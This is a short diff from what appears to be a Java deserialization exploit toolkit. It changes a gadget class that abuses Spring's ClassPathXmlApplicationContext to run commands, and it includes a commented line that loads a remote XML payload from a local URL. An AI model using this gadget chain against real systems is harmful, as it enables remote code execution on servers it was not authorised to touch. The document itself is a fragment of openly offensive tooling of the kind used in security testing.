@@ -19,7 +19,7 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 
 public class Hibernate_ClassPathXmlApplicationContextExec implements Gadget {
-    public Object getObject(String command) throws Exception {
+    public Object getObject(String command,String path) throws Exception {
         DefaultFormatter defaultFormatter = new DefaultFormatter();
         defaultFormatter.setValueClass(Class.forName("org.springframework.context.support.ClassPathXmlApplicationContext"));
 //        defaultFormatter.stringToValue("http://127.0.0.1:8000/1.xml");
